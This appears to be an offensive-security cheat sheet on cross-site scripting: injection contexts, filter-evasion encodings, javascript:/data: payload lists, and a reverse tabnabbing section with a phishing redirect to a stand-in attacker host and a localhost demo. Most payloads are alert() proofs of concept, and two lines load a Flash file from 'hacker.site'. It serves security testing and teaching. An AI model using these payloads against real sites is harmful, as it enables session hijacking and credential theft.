#  Raw HTML

>If your input is **reflected on the raw HTML** page you will need to abuse some **HTML tag** in order to execute JS code: `<img , <iframe , <svg , <script` ... these are just some of the many possible HTML tags you could use.\
Also, keep in mind Client Side Template Injection.

# Inside HTML tags attribute

> If your input is reflected inside the value of the attribute of a tag you could try:

1.  To **escape from the attribute and from the tag** (then you will be in the raw HTML) and create new HTML tag to abuse: `"><img [...]`
2.  If you **can escape from the attribute but not from the tag** (`>` is encoded or deleted), depending on the tag you could **create an event** that executes JS code: `" autofocus onfocus=alert(1) x="`
3.  If you **cannot escape from the attribute** (`"` is being encoded or deleted), then depending on **which attribute** your value is being reflected in **if you control all the value or just a part** you will be able to abuse it. For **example**, if you control an event like `onclick=` you will be able to make it execute arbitrary code when it's clicked. Another interesting **example** is the attribute `href`, where you can use the `javascript:` protocol to execute arbitrary code: **`href="javascript:alert(1)"`**
4.  If your input is reflected inside "**unexpoitable tags**" you could try the **`accesskey`** trick to abuse the vuln (you will need some kind of social engineer to exploit this): **`" accesskey="x" onclick="alert(1)" x="`**

------------------------------------------------------------------------------------------------------------------------------------
#  Injecting inside raw HTML

When your input is reflected **inside the HTML page** or you can escape and inject HTML code in this context the **first** thing you need to do if check if you can abuse `<` to create new tags: Just try to **reflect** that **char** and check if it's being **HTML encoded** or **deleted** of if it is **reflected without changes**. **Only in the last case you will be able to exploit this case**.\
For this cases also **keep in mind** **Client Side Template Injection**.
* ***Note: A HTML comment can be closed using********`-->`********or ****`--!>`***

In this case and if no black/whitelisting is used, you could use payloads like:

```html
<script>
  alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>`
```
But, if tags/attributes black/whitelisting is being used, you will need to **brute-force which tags** you can create.\
Once you have **located which tags are allowed**, you would need to **brute-force attributes/events** inside the found valid tags to see how you can attack the context.

------------------------------------------------------------------------------------------------------------------------------------
# Injecting inside HTML tag

### Inside the tag/escaping from attribute value :

If you are in **inside a HTML tag**, the first thing you could try is to **escape** from the tag and use some of the techniques mentioned in the previous section to execute JS code.
If you **cannot escape from the tag**, you could create new attributes inside the tag to try to execute JS code, for example using some payload like (*note that in this example double quotes are use to escape from the attribute, you won't need them if your input is reflected directly inside the tag*):

```html
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```

* **Style events**

`<p style="animation: x;" onanimationstart="alert()">XSS</p>`

`<p style="animation: x;" onanimationend="alert()">XSS</p>`

* payload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
```html
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
```
* moving your mouse anywhere over the page (0-click-ish):
```html
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```

# Within the attribute

Even if you **cannot escape from the attribute** (`"` is being encoded or deleted), depending on **which attribute** your value is being reflected in **if you control all the value or just a part** you will be able to abuse it. For **example**, if you control an event like `onclick=` you will be able to make it execute arbitrary code when it's clicked.
Another interesting **example** is the attribute `href`, where you can use the `javascript:` protocol to execute arbitrary code: **`href="javascript:alert(1)"`**

**Bypass inside event using HTML encoding/URL encode**

The **HTML encoded characters** inside the value of HTML tags attributes are **decoded on runtime**. Therefore something like the following will be valid (the payload is in bold): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

* Note that **any kind of HTML encode is valid**:

```html
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>`
```

**Note that URL encode will also work:**
```html
`<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>`
```

**Bypass inside event using Unicode encode**
```html
`//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />`
```

### Special Protocols Within the attribute

There you can use the protocols **`javascript:`** or **`data:`** in some places to **execute arbitrary JS code**. Some will require user interaction on some won't.

```js
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```

**Places where you can inject these protocols**

**In general** the `javascript:` protocol can be **used in any tag that accepts the attribute `href`** and in **most** of the tags that accepts the **attribute `src`** (but not `<img`)

```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```

**Other obfuscation tricks**

***In this case the HTML encoding and the Unicode encoding trick from the previous section is also valid as you are inside an attribute.***

```html
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```

Moreover, there is another **nice trick** for these cases: **Even if your input inside `javascript:...` is being URL encoded, it will be URL decoded before it's executed.** So, if you need to **escape** from the **string** using a **single quote** and you see that **it's being URL encoded**, remember that **it doesn't matter,** it will be **interpreted** as a **single quote** during the **execution** time.

```html
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```

* Note that if you try to **use both** `URLencode + HTMLencode` in any order to encode the **payload** it **won't** **work**, but you can **mix them inside the payload**.

**Using Hex and Octal encode with `javascript:`**

You can use **Hex** and **Octal encode** inside the `src` attribute of `iframe` (at least) to declare **HTML tags to execute JS**:

```html
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```

---
# Reverse tab nabbing

```html
<a target="_blank" rel="opener"
```

If you can inject any URL in an arbitrary **`<a href=`** tag that contains the **`target="_blank" and rel="opener"`** attributes

### Description

>In a situation where an **attacker** can **control** the **`href`** argument of an **`<a`** tag with the attribute **`target="_blank" rel="opener"`** that is going to be clicked by a victim, the **attacker** **point** this **link** to a web under his control (a **malicious** **website**). Then, once the **victim clicks** the link and access the attackers website, this **malicious** **website** will be able to **control** the **original** **page** via the javascript object **`window.opener`**.\
If the page doesn't have **`rel="opener"` but contains `target="_blank"` it also doesn't have `rel="noopener"`** it might be also vulnerable.

>A regular way to abuse this behaviour would be to **change the location of the original web** via `window.opener.location = https://attacker.com/victim.html` to a web controlled by the attacker that **looks like the original one**, so it can **imitate** the **login** **form** of the original website and ask for credentials to the user.

>However, note that as the **attacker now can control the window object of the original website** he can abuse it in other ways to perform **stealthier attacks** (maybe modifying javascript events to ex-filtrate info to a server controlled by him?)

-----------------------------------------------------------------------------------

### With back link 

* Link between parent and child pages when prevention attribute is not used:

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITH_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITH_LINK.png)

### Without back link
* Link between parent and child pages when prevention attribute is used:

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITHOUT_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITHOUT_LINK.png)

### Examples :

Create the following pages in a folder and run a web server with ```python3 -m http.server```
Then, **access** ```http://127.0.0.1:8000/```vulnerable.html, **click** on the link and note how the **original** **website** **URL** **changes**.

```html
<!DOCTYPE html>
<html>
<body>
<h1>Victim Site</h1>
<a href="http://127.0.0.1:8000/malicious.html" target="_blank" rel="opener">Controlled by the attacker</a>
</body>
</html>
```

```html
<!DOCTYPE html>
<html>
 <body>
  <script> window.opener.location = "http://127.0.0.1:8000/malicious_redir.html"; </script>
 </body>
</html>
```

```html
<!DOCTYPE html>
<html>
<body>
<h1>New Malicious Site</h1>
</body>
</html>
```

### Accessible properties :

* In the scenario where a **cross-origin** access occurs (access across different domains), the properties of the **window** JavaScript class instance, referred to by the **opener** JavaScript object reference, that can be accessed by a malicious site are limited to the following:

-   **```opener.closed```**: This property is accessed to determine if a window has been closed, returning a boolean value.
-   **```opener.frames```**: This property provides access to all iframe elements within the current window.
-   **```opener.length```**: The number of iframe elements present in the current window is returned by this property.
-   **```opener.opener```**: A reference to the window that opened the current window can be obtained through this property.
-   **```opener.parent```**: This property returns the parent window of the current window.
-   **```opener.self```**: Access to the current window itself is provided by this property.
-   **```opener.top```**: This property returns the topmost browser window.

However, in instances where the domains are identical, the malicious site gains access to all properties exposed by the **```window```** JavaScript object reference.
